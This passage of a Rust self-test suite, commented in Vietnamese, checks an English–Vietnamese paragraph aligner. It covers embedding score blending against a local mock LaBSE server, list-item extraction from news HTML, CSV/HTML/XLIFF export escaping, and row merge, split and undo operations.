    let expect_one = (1.0 - aligner::W_EMB) * s_lex + aligner::W_EMB;
    let expect_zero = s_lex;
    if (s_one - expect_one).abs() > 0.003 {
        return Err(format!(
            "cos=1: kỳ vọng ~{:.3}, được {:.3}",
            expect_one, s_one
        ));
    }
    if (s_zero - expect_zero).abs() > 0.001 {
        return Err(format!(
            "cos=0: phải giữ nguyên sàn từ vựng {:.3}, được {:.3}",
            expect_zero, s_zero
        ));
    }
    if s_one <= s_lex {
        return Err("cos=1 phải NÂNG điểm lên trên điểm từ vựng".into());
    }
    if out_one.engine != "lexical+labse" {
        return Err(format!(
            "có ma trận cosine phải ghi engine \"lexical+labse\", được {:?}",
            out_one.engine
        ));
    }
    // ma trận SAI kích thước phải bị bỏ qua an toàn (fallback, không panic)
    let out_bad =
        aligner::align_with_emb(en, vi, &opts, Some(&[0.9, 0.9, 0.9])).map_err(|e| e.0)?;
    if out_bad.engine != "lexical" || out_bad.rows[0].score != Some(s_lex) {
        return Err("ma trận cosine sai kích thước phải fallback về đúng điểm từ vựng".into());
    }

    // ---------- Phần B: đường ống HTTP thật qua dịch vụ giả lập ----------
    // 5 cặp EN–VI KHÔNG chung từ vựng (chỉ số thứ tự trùng) — LaBSE giả lập trả
    // vector trực giao: EN[i] và VI[i] cùng vector -> cosine=1; khác cặp -> 0.
    let en_paras: Vec<String> = (0..5)
        .map(|i| format!("English sentence number {} with plain words only.", i))
        .collect();
    let vi_paras: Vec<String> = (0..5)
        .map(|i| format!("Câu tiếng Việt thứ {} hoàn toàn không chung từ vựng.", i))
        .collect();

    let dim = 8usize;
    let mapping: Arc<StdMutex<HashMap<String, Vec<f32>>>> = Arc::new(StdMutex::new(HashMap::new()));
    for i in 0..5 {
        let mut v = vec![0.0f32; dim];
        v[i] = 1.0;
        mapping
            .lock()
            .unwrap()
            .insert(en_paras[i].clone(), v.clone());
        mapping.lock().unwrap().insert(vi_paras[i].clone(), v);
    }

    let listener = TcpListener::bind("127.0.0.1:0").map_err(|e| format!("bind mock: {}", e))?;
    let addr = listener
        .local_addr()
        .map_err(|e| format!("addr mock: {}", e))?;
    let base_url = format!("http://{}", addr);
    let map_shared = mapping.clone();
    let _serve = std::thread::spawn(move || {
        let mut served = 0usize;
        for stream in listener.incoming() {
            served += 1;
            if served > 64 {
                break;
            }
            let mut stream = match stream {
                Ok(s) => s,
                Err(_) => continue,
            };
            // đọc trọn request (headers + body theo Content-Length)
            let mut buf: Vec<u8> = Vec::new();
            let mut tmp = [0u8; 8192];
            loop {
                let complete = if let Some(pos) = find_subslice(&buf, b"\r\n\r\n") {
                    let head = String::from_utf8_lossy(&buf[..pos]).to_ascii_lowercase();
                    let cl: usize = head
                        .lines()
                        .find(|l| l.starts_with("content-length:"))
                        .and_then(|l| l[15..].trim().parse().ok())
                        .unwrap_or(0);
                    buf.len() >= pos + 4 + cl
                } else {
                    false
                };
                if complete {
                    break;
                }
                match stream.read(&mut tmp) {
                    Ok(0) | Err(_) => break,
                    Ok(k) => buf.extend_from_slice(&tmp[..k]),
                }
            }
            let head_end = find_subslice(&buf, b"\r\n\r\n").unwrap_or(buf.len());
            let head = String::from_utf8_lossy(&buf[..head_end]).to_string();
            let req_line = head.lines().next().unwrap_or("").to_string();
            let body_bytes = &buf[(head_end + 4).min(buf.len())..];
            let (status, text, payload) = if req_line.contains("/health") {
                (
                    200,
                    "OK",
                    serde_json::json!({"status":"ok","model":"mock-labse","dim":dim}).to_string(),
                )
            } else if req_line.contains("/embed") {
                let parsed: serde_json::Value =
                    serde_json::from_slice(body_bytes).unwrap_or(serde_json::json!({}));
                let texts = parsed["texts"].as_array().cloned().unwrap_or_default();
                let guard = map_shared.lock().unwrap();
                let emb: Vec<Vec<f32>> = texts
                    .iter()
                    .map(|t| {
                        guard
                            .get(t.as_str().unwrap_or(""))
                            .cloned()
                            .unwrap_or_else(|| vec![0.0; dim])
                    })
                    .collect();
                (
                    200,
                    "OK",
                    serde_json::json!({ "embeddings": emb }).to_string(),
                )
            } else {
                (
                    404,
                    "Not Found",
                    serde_json::json!({"error":"not found"}).to_string(),
                )
            };
            let resp = format!(
                "HTTP/1.1 {} {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                status,
                text,
                payload.len(),
                payload
            );
            let _ = stream.write_all(resp.as_bytes());
            let _ = stream.flush();
        }
    });

    std::env::set_var("CANH_DOI_LABSE_URL", &base_url);
    crate::embedder::invalidate_health_cache();
    let outcome = crate::embedder::align_pipeline(
        &en_paras.join("\n\n"),
        &vi_paras.join("\n\n"),
        &AlignOptions::default(),
    )
    .map_err(|e| e.0)?;
    if outcome.engine != "lexical+labse" || outcome.output.engine != "lexical+labse" {
        return Err(format!(
            "pipeline qua mock phải chạy engine \"lexical+labse\", được {:?}/{:?}",
            outcome.engine, outcome.output.engine
        ));
    }
    if let Some(e) = &outcome.labse_error {
        return Err(format!("LaBSE giả lập không được báo lỗi, được: {}", e));
    }
    let out = &outcome.output;
    if out.rows.len() != 5 {
        return Err(format!("kỳ vọng đúng 5 hàng i↔i, được {}", out.rows.len()));
    }
    for (i, r) in out.rows.iter().enumerate() {
        if r.en_index != Some(i) || r.vi_index != Some(i) {
            return Err(format!(
                "hàng {}: cosine=1 theo đường chéo phải ghép i↔i, được EN={:?} VI={:?}",
                i, r.en_index, r.vi_index
            ));
        }
        if r.status != Status::AutoMatched {
            return Err(format!(
                "hàng {}: cosine=1 -> điểm ≥ 0.6 -> phải Tự khớp, được {:?}",
                i, r.status
            ));
        }
        if r.score.map(|s| s < 0.55).unwrap_or(true) {
            return Err(format!(
                "hàng {}: điểm hoà trộn phải ≥ 0.55 khi cosine=1, được {:?}",
                i, r.score
            ));
        }
    }
    aligner::validate_invariants(out).map_err(|e| format!("bất biến sau LaBSE: {}", e))?;
    Ok(())
}

fn t_list_items_extract() -> Result<(), String> {
    // HỒI QUY bản ≤2.2 (lỗi người dùng báo trên bài SBS): câu dẫn <p> rồi <ul><li>…</li></ul>
    // — bản cũ chỉ quét <p> nên MẤT HẾT mục gạch đầu dòng, chỉ còn "bao gồm:".
    // Kèm đủ bẫy chrom thật của SBS: nav/aside/footer, li chỉ toàn link (kèm <span> </span>
    // đuôi như SBS EN), li icon app (<img>+nhãn ngắn), <li><p> (không được đếm 2 lần).
    let html = r##"<html><head><title>Bài có danh sách</title></head><body>
<nav><ul><li><a href="/news">News</a></li><li><a href="/sport">Sport</a></li></ul></nav>
<article>
<p>Những thay đổi được đề xuất bao gồm:</p>
<ul>
<li><span>Hạ ngưỡng công bố quyên góp từ 16.900 AUD xuống còn 1.000 AUD.</span></li>
<li>Giới hạn chi tiêu cho mỗi ứng viên ở mức 800.000 AUD cho mỗi chiến dịch tranh cử.</li>
<li><p>Giới hạn số tiền quyên góp tối đa từ một cá nhân ở mức 20.000 AUD.</p></li>
</ul>
<p>Những đề xuất này nhằm tăng cường tính minh bạch trong tài chính bầu cử.</p>
<ul>
<li><a href="/other"><span>Bài viết liên quan: cờ bạc và sức khoẻ cộng đồng</span></a><span> </span></li>
<li><img src="app.png" alt=""/><span class="subtitle1">SBS Audio</span><div><a href="ios">iOS</a><a href="android">Android</a></div></li>
<li>Duncan Turpie đã tài trợ 472.088 AUD cho Đảng Xanh.</li>
</ul>
<div><p>Đoạn kết nằm trong div, dài hơn ba mươi ký tự để được giữ nguyên vẹn.</p></div>
<aside><p>Đăng ký nhận bản tin hằng ngày của chúng tôi ngay hôm nay nhé bạn ơi.</p><ul><li>Mục trong aside không được lấy</li></ul></aside>
<footer><p>Locked Bag 028, Crows Nest NSW 1585</p><ul><li>Địa chỉ bưu điện trong footer</li></ul></footer>
</article>
</body></html>"##;
    let (_title, paras) = fetcher::extract(html);
    let expected: [&str; 7] = [
        "Những thay đổi được đề xuất bao gồm:",
        "Hạ ngưỡng công bố quyên góp từ 16.900 AUD xuống còn 1.000 AUD.",
        "Giới hạn chi tiêu cho mỗi ứng viên ở mức 800.000 AUD cho mỗi chiến dịch tranh cử.",
        "Giới hạn số tiền quyên góp tối đa từ một cá nhân ở mức 20.000 AUD.",
        "Những đề xuất này nhằm tăng cường tính minh bạch trong tài chính bầu cử.",
        "Duncan Turpie đã tài trợ 472.088 AUD cho Đảng Xanh.",
        "Đoạn kết nằm trong div, dài hơn ba mươi ký tự để được giữ nguyên vẹn.",
    ];
    if paras.len() != expected.len() {
        return Err(format!(
            "kỳ vọng {} đoạn (p + li theo thứ tự tài liệu), được {}: {:#?}",
            expected.len(),
            paras.len(),
            paras
        ));
    }
    for (i, (got, want)) in paras.iter().zip(expected.iter()).enumerate() {
        if got != want {
            return Err(format!(
                "đoạn {}: được {:?}, kỳ vọng {:?}",
                i + 1,
                got,
                want
            ));
        }
    }
    Ok(())
}

fn t_export_new_formats() -> Result<(), String> {
    use crate::aligner::Row;
    // 4 hàng cố ý dựng đủ mọi nhánh: xanh (auto + human), vàng (needs_review),
    // đỏ (unmatched một phía), kèm dấu phẩy + nháy kép để kiểm escape CSV/HTML/XLIFF.
    let en0 = "Hanoi hosted the summit in 2025, drawing 4,000 guests.";
    let en1 = "The mayor said \"clean energy, jobs and growth\" will lead the agenda.";
    let en2 = "A short paragraph without any translation at all appears in this row.";
    let vi0 = "Hà Nội tổ chức hội nghị năm 2025, thu hút 4.000 khách.";
    let vi1 =
        "Thị trưởng nói \"năng lượng sạch, việc làm và tăng trưởng\" sẽ dẫn dắt chương trình.";
    let vi2 = "Đây là đoạn tiếng Việt thừa, không có bản tiếng Anh tương ứng.";
    let rows = vec![
        Row {
            index: 0,
            en_index: Some(0),
            vi_index: Some(0),
            en: Some(en0.into()),
            vi: Some(vi0.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::AutoMatched,
            score: Some(0.85),
        },
        Row {
            index: 1,
            en_index: Some(1),
            vi_index: Some(1),
            en: Some(en1.into()),
            vi: Some(vi1.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::NeedsReview,
            score: Some(0.5),
        },
        Row {
            index: 2,
            en_index: Some(2),
            vi_index: None,
            en: Some(en2.into()),
            vi: None,
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::Unmatched,
            score: None,
        },
        Row {
            index: 3,
            en_index: None,
            vi_index: Some(2),
            en: None,
            vi: Some(vi2.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::HumanConfirmed,
            score: None,
        },
    ];
    let session = Session {
        id: "test-fmt23".into(),
        title: "Bài kiểm định dạng xuất".into(),
        created_at: 1,
        updated_at: 1,
        english: vec![en0.into(), en1.into(), en2.into()],
        vietnamese: vec![vi0.into(), vi1.into(), vi2.into()],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };

    // ---- parse() nhận định dạng mới ----
    for (s, want) in [
        ("csv", ExportFormat::Csv),
        ("html", ExportFormat::Html),
        ("htm", ExportFormat::Html),
        ("xliff", ExportFormat::Xliff),
        ("xlf", ExportFormat::Xliff),
    ] {
        if ExportFormat::parse(s) != Some(want) {
            return Err(format!("parse({:?}) phải cho {:?}", s, want));
        }
    }
    if ExportFormat::parse("docx").is_some() {
        return Err("parse phải từ chối định dạng lạ".into());
    }

    // ---- CSV ----
    let r = export_session(&session, ExportFormat::Csv)?;
    if !r.content.starts_with('\u{FEFF}') {
        return Err("CSV phải bắt đầu bằng BOM UTF-8 (Excel mở đúng tiếng Việt)".into());
    }
    if !r.content.contains("index,status,score,en,vi\n") {
        return Err("CSV thiếu dòng header".into());
    }
    let lines: Vec<&str> = r.content.trim_end_matches('\n').split('\n').collect();
    if lines.len() != 5 {
        return Err(format!(
            "CSV phải có 1 header + 4 hàng, được {} dòng",
            lines.len()
        ));
    }
    // escape RFC 4180: nháy kép nội bộ nhân đôi, cả ô bọc trong "..."
    if !r
        .content
        .contains("\"The mayor said \"\"clean energy, jobs and growth\"\" will lead the agenda.\"")
    {
        return Err(format!("CSV escape RFC 4180 sai: {}", r.content));
    }
    if r.content
        .lines()
        .nth(3)
        .map(|l| !l.ends_with(",none"))
        .unwrap_or(true)
    {
        return Err(format!(
            "CSV hàng 3 (EN-only) phải kết thúc bằng 'none': {}",
            r.content
        ));
    }
    if !r.content.contains("\n3,human_confirmed,,none,") {
        return Err(format!(
            "CSV hàng 4 (VI-only) phải có 'none' ở cột EN: {}",
            r.content
        ));
    }
    if r.none_count != 2 || r.rows != 4 {
        return Err(format!(
            "CSV none_count phải 2, rows 4 — được {}/{}",
            r.none_count, r.rows
        ));
    }

    // ---- HTML ----
    let r = export_session(&session, ExportFormat::Html)?;
    for must in [
        "<tr class=\"green\">",
        "<tr class=\"yellow\">",
        "<tr class=\"red\">",
        "&quot;clean energy, jobs and growth&quot;",
        "<code>none</code>",
        "Khớp / khớp phần lớn (2)",
        "Cần soát / khớp một phần (1)",
        "Không khớp hoàn toàn (1)",
        "Tổng 4 hàng",
    ] {
        if !r.content.contains(must) {
            return Err(format!("HTML thiếu {:?}", must));
        }
    }
    if r.none_count != 2 {
        return Err(format!("HTML none_count phải 2, được {}", r.none_count));
    }

    // ---- XLIFF ----
    let r = export_session(&session, ExportFormat::Xliff)?;
    for must in [
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
        "urn:oasis:names:tc:xliff:document:1.2",
        "source-language=\"en\" target-language=\"vi\"",
        "state=\"translated\"",
        "state=\"needs-review-translation\"",
        "state=\"missing\"",
        "state=\"final\"",
        "approved=\"yes\"",
        "approved=\"no\"",
        "&quot;năng lượng sạch, việc làm và tăng trưởng&quot;",
        "<target xml:lang=\"vi\" state=\"missing\">none</target>",
        "<source xml:lang=\"en\">none</source>",
    ] {
        if !r.content.contains(must) {
            return Err(format!("XLIFF thiếu {:?}", must));
        }
    }
    if r.content.matches("<trans-unit").count() != 4 {
        return Err("XLIFF phải có đúng 4 trans-unit".into());
    }
    if r.none_count != 2 {
        return Err(format!("XLIFF none_count phải 2, được {}", r.none_count));
    }
    Ok(())
}

// ========================= BẢN 2.4: gộp hàng (kéo–thả) =========================

/// Đổi Session → AlignOutput để chạy validate_invariants trong selftest.
fn to_output(s: &Session) -> crate::aligner::AlignOutput {
    crate::aligner::AlignOutput {
        english: s.english.clone(),
        vietnamese: s.vietnamese.clone(),
        rows: s.rows.clone(),
        options: s.options.clone(),
        engine: s.engine.clone(),
    }
}

/// Dựng phiên thủ công (không qua bộ ghép) để kiểm soát chính xác từng hàng
/// — dùng cho các bài kiểm gộp/tách ở bản 2.4.
fn manual_session(en: Vec<String>, vi: Vec<String>, rows: Vec<Row>) -> Session {
    let mut rows = rows;
    for (i, r) in rows.iter_mut().enumerate() {
        r.index = i;
    }
    Session {
        id: generate_id(),
        title: derive_title(&en, &vi),
        created_at: 1,
        updated_at: 1,
        english: en,
        vietnamese: vi,
        rows,
        options: AlignOptions::default(),
        engine: "lexical".to_string(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    }
}

fn pair_row(
    a: usize,
    b: usize,
    en: &[String],
    vi: &[String],
    status: Status,
    score: Option<f64>,
) -> Row {
    Row {
        index: 0,
        en_index: Some(a),
        vi_index: Some(b),
        en: en.get(a).cloned(),
        vi: vi.get(b).cloned(),
        en_extra: Vec::new(),
        vi_extra: Vec::new(),
        status,
        score,
    }
}

/// 22. Gộp 2 hàng liền kề (2 cặp) → 1 hàng 2 EN · 2 VI; xuất đủ 6 định dạng.
fn t_merge_adjacent_and_export() -> Result<(), String> {
    let store = temp_store("merge");
    let mut s = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    let n0 = s.rows.len();
    // gộp hàng 1 vào hàng 0 (hai cặp đầu)
    s.merge_next(0, None).map_err(|e| e.to_string())?;
    if s.rows.len() != n0 - 1 {
        return Err(format!(
            "sau gộp phải còn {} hàng, được {}",
            n0 - 1,
            s.rows.len()
        ));
    }
    let r0 = &s.rows[0];
    if r0.en_segments().len() != 2 || r0.vi_segments().len() != 2 {
        return Err("hàng gộp phải có 2 EN · 2 VI".into());
    }
    if r0.status != Status::NeedsReview {
        return Err("gộp mặc định phải là needs_review".into());
    }
    if r0.score.is_some() {
        return Err("điểm cũ phải bị xoá sau gộp".into());
    }
    // hàng 0 giữ đoạn chính là đoạn 0, đoạn gộp là đoạn 1
    let (i0, _) = r0.en_segments()[0];
    let (i1, _) = r0.en_segments()[1];
    if i0 != 0 || i1 != 1 {
        return Err(format!("thứ tự đoạn gộp sai: {} rồi {}", i0, i1));
    }
    // gộp hàng cuối phải lỗi (không còn hàng dưới)
    if s.merge_next(s.rows.len() - 1, None).is_ok() {
        return Err("gộp hàng cuối phải bị từ chối".into());
    }
    // gộp với trạng thái unmatched phải bị từ chối
    if s.merge_next(0, Some(Status::Unmatched)).is_ok() {
        return Err("gộp với unmatched phải bị từ chối".into());
    }
    // xuất 6 định dạng — hàng gộp phải nguyên vẹn, không lỗi bất biến
    let r = export_session(&s, ExportFormat::Tsv)?;
    let joined = format!("{} {}", EN_ARTICLE[0], EN_ARTICLE[1]);
    if !r.content.contains(&joined) {
        return Err("TSV phải nối 2 đoạn EN bằng dấu cách".into());
    }
    let r = export_session(&s, ExportFormat::Moses)?;
    if !r.content.contains(&format!("{} ||| ", joined)) {
        return Err("Moses phải nối 2 đoạn EN bằng dấu cách".into());
    }
    let r = export_session(&s, ExportFormat::Json)?;
    if !r.content.contains("\"enParts\"") || !r.content.contains("\"viParts\"") {
        return Err("JSON phải có enParts/viParts cho hàng gộp".into());
    }
    let r = export_session(&s, ExportFormat::Csv)?;
    // ô CSV chứa 2 dòng trong 1 ô trích dẫn: "en0\nen1"
    if !r
        .content
        .contains(&format!("\"{}\n{}\"", EN_ARTICLE[0], EN_ARTICLE[1]))
    {
        return Err("CSV phải giữ 2 đoạn trong cùng một ô (trích dẫn nhiều dòng)".into());
    }
    let r = export_session(&s, ExportFormat::Html)?;
    for must in ["🔗 2 EN · 2 VI — đã gộp", "·đoạn 1", "·đoạn 2"] {
        if !r.content.contains(must) {
            return Err(format!("HTML thiếu {:?}", must));
        }
    }
    let r = export_session(&s, ExportFormat::Xliff)?;
    if !r
        .content
        .contains(&format!("<source xml:lang=\"en\">{}</source>", joined))
    {
        return Err("XLIFF phải nối 2 đoạn EN bằng dấu cách".into());
    }
    Ok(())
}

/// 23. Kịch bản SBS: 1 EN ↔ nhiều VI (1 câu dẫn + 3 gạch đầu dòng) — kéo 3 hàng VI lên.
fn t_merge_one_to_many() -> Result<(), String> {
    let en: Vec<String> = vec![
        "The proposed changes include three key items for political donations.".into(),
        "Second paragraph about the final report of the committee.".into(),
    ];
    let vi: Vec<String> = vec![
        "Những thay đổi được đề xuất bao gồm ba mục chính về quyên góp chính trị.".into(),
        "Hạ ngưỡng công bố xuống 1.000 AUD.".into(),
        "Giới hạn chi phí vận động tranh cử ở mức 800.000 AUD.".into(),
        "Giới hạn đóng góp của cá nhân ở mức 20.000 AUD.".into(),
        "Đoạn thứ hai nói về báo cáo cuối cùng của uỷ ban.".into(),
    ];
    // bộ ghép điển hình sẽ ra: Pair(0,0) · 3 hàng VI-only · Pair(1,4)
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::AutoMatched, Some(0.9)),
        Row::single_side(None, Some((1, vi[1].clone())), Status::Unmatched),
        Row::single_side(None, Some((2, vi[2].clone())), Status::Unmatched),
        Row::single_side(None, Some((3, vi[3].clone())), Status::Unmatched),
        pair_row(1, 4, &en, &vi, Status::AutoMatched, Some(0.9)),
    ];
    let mut s = manual_session(en, vi, rows);
    // kéo 3 hàng VI (1..3) lên gộp vào hàng 0 — đúng thứ tự UI mergeUp làm (từ dưới lên)
    for target in (0..=2).rev() {
        s.merge_next(target, None).map_err(|e| e.to_string())?;
    }
    if s.rows.len() != 2 {
        return Err(format!("sau gộp phải còn 2 hàng, được {}", s.rows.len()));
    }
    let r0 = &s.rows[0];
    if r0.en_segments().len() != 1 || r0.vi_segments().len() != 4 {
        return Err("hàng 0 phải là 1 EN · 4 VI (câu dẫn + 3 mục)".into());
    }
    let idxs: Vec<usize> = r0.vi_segments().iter().map(|(i, _)| *i).collect();
    if idxs != vec![0, 1, 2, 3] {
        return Err(format!("đoạn VI gộp sai thứ tự: {:?}", idxs));
    }
    // bất biến vẫn giữ (mỗi đoạn 1 lần, đơn điệu)
    let out = to_output(&s);
    crate::aligner::validate_invariants(&out).map_err(|e| e.to_string())?;
    // xuất TSV: 2 dòng, hàng 0 nối 4 đoạn VI
    let r = export_session(&s, ExportFormat::Tsv)?;
    if r.rows != 2 {
        return Err(format!("TSV phải 2 hàng, được {}", r.rows));
    }
    let vi_joined = format!(
        "{} {} {} {}",
        "Những thay đổi được đề xuất bao gồm ba mục chính về quyên góp chính trị.",
        "Hạ ngưỡng công bố xuống 1.000 AUD.",
        "Giới hạn chi phí vận động tranh cử ở mức 800.000 AUD.",
        "Giới hạn đóng góp của cá nhân ở mức 20.000 AUD."
    );
    if !r.content.contains(&vi_joined) {
        return Err("TSV hàng gộp phải nối đủ 4 đoạn VI".into());
    }
    Ok(())
}

/// 24. Gộp xong TÁCH (✕ Không khớp) → trả về đúng từng đoạn gốc, không mất, không lặp.
fn t_merge_split_roundtrip() -> Result<(), String> {
    let en: Vec<String> = vec![
        "The proposed changes include three key items for political donations.".into(),
        "Second paragraph about the final report of the committee.".into(),
    ];
    let vi: Vec<String> = vec![
        "Những thay đổi được đề xuất bao gồm ba mục chính về quyên góp chính trị.".into(),
        "Hạ ngưỡng công bố xuống 1.000 AUD.".into(),
        "Giới hạn chi phí vận động tranh cử ở mức 800.000 AUD.".into(),
        "Giới hạn đóng góp của cá nhân ở mức 20.000 AUD.".into(),
        "Đoạn thứ hai nói về báo cáo cuối cùng của uỷ ban.".into(),
    ];
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::AutoMatched, Some(0.9)),
        Row::single_side(None, Some((1, vi[1].clone())), Status::Unmatched),
        Row::single_side(None, Some((2, vi[2].clone())), Status::Unmatched),
        Row::single_side(None, Some((3, vi[3].clone())), Status::Unmatched),
        pair_row(1, 4, &en, &vi, Status::AutoMatched, Some(0.9)),
    ];
    let mut s = manual_session(en, vi, rows);
    for target in (0..=2).rev() {
        s.merge_next(target, None).map_err(|e| e.to_string())?;
    }
    // tách hàng gộp 0 → 1 EN-only + 4 VI-only = 5 hàng
    s.set_row_status(0, Status::Unmatched)
        .map_err(|e| e.to_string())?;
    if s.rows.len() != 6 {
        return Err(format!(
            "sau tách phải có 6 hàng (5 đơn phía + 1 cặp), được {}",
            s.rows.len()
        ));
    }
    // 5 hàng đầu: xen kẽ EN-only rồi 4 VI-only, đúng chỉ số gốc
    let expect: Vec<(Option<usize>, Option<usize>)> = vec![
        (Some(0), None),
        (None, Some(0)),
        (None, Some(1)),
        (None, Some(2)),
        (None, Some(3)),
        (Some(1), Some(4)),
    ];
    for (k, (ea, vb)) in expect.iter().enumerate() {
        if (s.rows[k].en_index, s.rows[k].vi_index) != (*ea, *vb) {
            return Err(format!("hàng {} sau tách sai cấu trúc", k));
        }
        if s.rows[k].status != Status::Unmatched && k != 5 {
            return Err(format!("hàng {} sau tách phải unmatched", k));
        }
    }
    // reindex
    for (i, r) in s.rows.iter().enumerate() {
        if r.index != i {
            return Err(format!("reindex sai tại {}", i));
        }
    }
    // xuất không lỗi; none_count = 5 (mỗi hàng đơn phía 1 ô none)
    let r = export_session(&s, ExportFormat::Tsv)?;
    if r.none_count != 5 {
        return Err(format!("none_count sau tách phải 5, được {}", r.none_count));
    }
    let out = to_output(&s);
    crate::aligner::validate_invariants(&out).map_err(|e| e.to_string())?;
    Ok(())
}

/// 25. Gộp 2 hàng cùng phía (EN-only) + xác nhận human_confirmed một phía → xuất vẫn OK.
fn t_merge_one_side_and_human_confirm() -> Result<(), String> {
    let en: Vec<String> = vec![
        "First paragraph only in English without any translation.".into(),
        "Second paragraph also only in English.".into(),
        "Third paragraph has its Vietnamese counterpart.".into(),
    ];
    let vi: Vec<String> = vec!["Đoạn thứ ba có bản dịch tiếng Việt.".into()];
    let rows = vec![
        Row::single_side(Some((0, en[0].clone())), None, Status::Unmatched),
        Row::single_side(Some((1, en[1].clone())), None, Status::Unmatched),
        pair_row(2, 0, &en, &vi, Status::AutoMatched, Some(0.9)),
    ];
    let mut s = manual_session(en, vi, rows);
    // gộp 2 hàng EN-only → vẫn một phía → mặc định Unmatched
    s.merge_next(0, None).map_err(|e| e.to_string())?;
    if s.rows.len() != 2 {
        return Err("sau gộp phải còn 2 hàng".into());
    }
    let r0 = &s.rows[0];
    if r0.en_segments().len() != 2 || r0.vi_segments().len() != 0 {
        return Err("hàng gộp phải 2 EN · 0 VI".into());
    }
    if r0.status != Status::Unmatched {
        return Err("gộp cùng phía mặc định phải unmatched".into());
    }
    // xác nhận "không có bản dịch" → human_confirmed một phía (ngoại lệ I4 có chủ đích)
    s.set_row_status(0, Status::HumanConfirmed)
        .map_err(|e| e.to_string())?;
    // xuất qua đủ 6 định dạng — không được vỡ bất biến
    for fmt in [
        ExportFormat::Tsv,
        ExportFormat::Moses,
        ExportFormat::Json,
        ExportFormat::Csv,
        ExportFormat::Html,
        ExportFormat::Xliff,
    ] {
        let r = export_session(&s, fmt)?;
        if r.none_count != 1 {
            return Err(format!(
                "{:?}: none_count phải 1, được {:?}",
                fmt, r.none_count
            ));
        }
        if !r.content.contains("none") {
            return Err(format!("{:?}: thiếu chữ none nguyên văn", fmt));
        }
    }
    // hàng một phía không nhận needs_review/auto_matched
    if s.set_row_status(0, Status::NeedsReview).is_ok() {
        return Err("hàng một phía không được nhận needs_review".into());
    }
    Ok(())
}

// ========================= BẢN 2.5: mô hình khối (kéo–thả tự do) =========================

/// 26. Di chuyển khối: kéo VI rời khỏi hàng mồ côi → ô VI của hàng khác (đúng kịch bản
/// "0-D1 / 0-E1 kéo lên xếp sau C1"), đổi thứ tự trong cùng ô, HOÀN TÁC trả về nguyên xi.
fn t_block_move_and_undo() -> Result<(), String> {
    let en: Vec<String> = vec![
        "Paragraph A about the summit with 4000 participants.".into(),
        "Paragraph B about clean energy and electric vehicles.".into(),
        "Paragraph C lists three donation rules introduced in 2025.".into(),
    ];
    let vi: Vec<String> = vec![
        "Đoạn A về hội nghị với 4000 người tham dự.".into(),
        "Đoạn B về năng lượng sạch và xe điện.".into(),
        "Đoạn C nêu ba quy tắc quyên góp đưa ra năm 2025.".into(),
        "Hạ ngưỡng công bố xuống 1.000 AUD.".into(),
        "Giới hạn chi phí vận động tranh cử ở mức 800.000 AUD.".into(),
    ];
    // hàng 3, 4: VI-only (mồ côi) — đúng trạng thái sau khi ghép thật
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::AutoMatched, Some(0.9)),
        pair_row(1, 1, &en, &vi, Status::AutoMatched, Some(0.9)),
        pair_row(2, 2, &en, &vi, Status::AutoMatched, Some(0.9)),
        Row::single_side(None, Some((3, vi[3].clone())), Status::Unmatched),
        Row::single_side(None, Some((4, vi[4].clone())), Status::Unmatched),
    ];
    let mut s = manual_session(en, vi, rows);
    let before = s.rows.clone();

    // ---- kéo khối VI của hàng 4 (đoạn gốc 4) vào ô VI của hàng 2 (nối cuối)
    let focus = s
        .move_block(Side::Vi, 4, 0, Some(2), usize::MAX, None)
        .map_err(|e| e)?;
    if s.rows.len() != 4 {
        return Err(format!(
            "hàng mồ côi mất khối cuối phải tự xoá — còn {} hàng",
            s.rows.len()
        ));
    }
    if focus != 2 {
        return Err(format!("focus phải là hàng 2, được {}", focus));
    }
    let r2 = &s.rows[2];
    let vi_ids: Vec<usize> = r2.vi_segments().iter().map(|(i, _)| *i).collect();
    if vi_ids != vec![2, 4] {
        return Err(format!("ô VI hàng 2 phải là [2, 4], được {:?}", vi_ids));
    }
    if r2.status != Status::NeedsReview || r2.score.is_some() {
        return Err("hàng vừa nhận khối phải về needs_review + xoá điểm cũ".into());
    }
    if s.rows[3].status != Status::Unmatched {
        return Err("hàng mồ côi còn lại phải unmatched".into());
    }

    // ---- đổi thứ tự trong cùng ô: đưa đoạn 4 lên TRƯỚC đoạn 2
    s.move_block(Side::Vi, 2, 1, Some(2), 0, None)
        .map_err(|e| e)?;
    let vi_ids: Vec<usize> = s.rows[2].vi_segments().iter().map(|(i, _)| *i).collect();
    if vi_ids != vec![4, 2] {
        return Err(format!("đổi chỗ trong ô phải ra [4, 2], được {:?}", vi_ids));
    }

    // ---- HOÀN TÁC 2 lần → trả về nguyên xi trạng thái đầu (kể cả trạng thái + điểm)
    s.undo().map_err(|e| e)?;
    s.undo().map_err(|e| e)?;
    if s.rows.len() != before.len() {
        return Err(format!(
            "sau 2 lần hoàn tác phải về {} hàng, được {}",
            before.len(),
            s.rows.len()
        ));
    }
    for (k, (a, b)) in s.rows.iter().zip(before.iter()).enumerate() {
        if a.status != b.status
            || a.score != b.score
            || a.en_index != b.en_index
            || a.vi_index != b.vi_index
            || a.vi_segments().len() != b.vi_segments().len()
        {
            return Err(format!("hoàn tác phải trả về nguyên xi hàng {}", k));
        }
    }
    // ---- LÀM LẠI 1 lần → bước "kéo vào hàng 2" quay lại
    s.redo().map_err(|e| e)?;
    if s.rows.len() != 4 || s.rows[2].vi_segments().len() != 2 {
        return Err("làm lại phải tái hiện bước kéo khối đầu tiên".into());
    }
    // hoàn tác khi rỗng phải báo lỗi rõ
    let mut s2 = manual_session(
        vec!["Only one paragraph here.".into()],
        vec![],
        vec![Row::single_side(
            Some((0, "Only one paragraph here.".into())),
            None,
            Status::Unmatched,
        )],
    );
    if s2.undo().is_ok() {
        return Err("hoàn tác khi chưa làm gì phải báo lỗi".into());
    }
    Ok(())
}

